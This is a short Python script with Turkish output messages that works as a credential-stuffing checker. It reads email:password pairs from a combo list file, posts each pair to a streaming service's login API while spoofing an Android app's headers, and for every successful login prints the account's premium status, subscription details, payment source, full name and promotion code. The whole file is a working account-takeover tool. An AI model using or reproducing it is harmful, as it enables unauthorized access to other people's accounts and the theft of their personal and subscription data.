import requests
import json

with open('combo.txt', 'r') as asdf:
    satır = asdf.readlines()
    for nmr, satır1 in enumerate(satır, start=1):
        try:
            email, password = satır1.strip().split(':')
        except ValueError:
            print(f"HATALI SATIR: {satır1.strip()} (Satır {nmr})")
            continue
        
        url = "https://api.gainapis.com/accounts/authenticate"
        
        headers = {
            "accept-encoding": "gzip",
            "content-length": "72",
            "content-type": "application/json",
            "host": "api.gainapis.com",
            "user-agent": "Dart/2.19 (dart:io)",
            "x-app-build-number": "373",
            "x-app-language": "TR",
            "x-app-version": "5.4.0",
            "x-device-app-type": "Mobile",
            "x-device-id": "NRD90M.G955NKSU1AQDC",
            "x-device-manufacturer": "samsung",
            "x-device-model": "SM-G955N",
            "x-device-os-version": "25",
            "x-device-platform": "android"
        }
        
        data = {
            "username": email,
            "password": password
        }
        
        response = requests.post(url, headers=headers, json=data)

        if 'access_token' in response.text:
            o = json.loads(response.text)
            g = o['account']
            a = g.get("isPremium", "bulunmadı")
            b = g.get("subscription_type", "bulunmadı")
            c = g.get("premium_expire_date", "bulunmadı")
            d = g.get('source', "bulunmadı")
            e = g.get('full_name', "bulunmadı")
            f = g.get('promotion', "bulunmadı")
            print(f"BAŞARILI HESAP {email}:{password} - Abonelik: {a} - Abonelik Türü: {b} - Premium Bitiş: {c} - Ödeme Türü: {d} - Tam Adı: {e} - Promosyon Kodu: {f}")
        else:
            print(f"HATALI HESAP {email}:{password}")
